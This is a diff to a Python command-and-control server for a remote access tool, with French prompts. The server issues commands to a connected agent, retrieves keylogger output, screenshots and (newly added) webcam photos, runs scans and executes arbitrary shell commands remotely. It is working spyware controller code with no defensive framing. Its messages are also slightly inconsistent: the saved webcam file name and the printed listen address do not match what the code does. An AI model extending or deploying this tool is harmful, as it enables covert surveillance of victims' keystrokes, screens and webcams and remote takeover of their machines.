@@ -22,7 +22,7 @@ def handle_connection(connection, address):
 
     while True:
         try:
-            command = input("Entrer 'help' pour afficher les commandes disponibles ou 'exit' pour quitter : ")
+            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
@@ -39,10 +39,12 @@ def handle_connection(connection, address):
                 except FileNotFoundError:
                     print("Aucun fichier keylog trouvé.")
 
-            elif command.lower() == 'screenshot':
+            elif command.lower() == 'screenshot' or command.lower() == 'webcam':
                 connection.send(command.encode())
+
                 img_size = int(connection.recv(1024).decode())
                 connection.send(b'OK')
+
                 img_data = b''
                 while len(img_data) < img_size:
                     packet = connection.recv(4096)
@@ -50,10 +52,14 @@ def handle_connection(connection, address):
                         break
                     img_data += packet
 
-                with open("screen.png", "wb") as f:
-                    f.write(img_data)
-                print("Capture réussie !")
-                continue
+                if command.lower() == 'screenshot':
+                    with open("screenshot.png", "wb") as f:
+                        f.write(img_data)
+                    print("Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
+                else:
+                    with open("webcam.png", "wb") as f:
+                        f.write(img_data)
+                    print("Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")
 
             elif command.startswith('scan'):
                 parts = command.split()
@@ -69,11 +75,9 @@ def handle_connection(connection, address):
 
             else:
                 connection.send(command.encode())
-
                 response = connection.recv(4096).decode()
                 if not response:
                     break
-
                 print(f"Output:\n{response}")
         except Exception as e:
             print(f"Error: {e}")
@@ -86,7 +90,7 @@ def start_server():
     Fonction pour établir une connexion avec l'agent.
     """
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ss.bind((ip_address, port_number))
+    ss.bind(('0.0.0.0', 1234))
     ss.listen(5)
     print(f"Serveur en écoute sur {ip_address}:{port_number}")
 
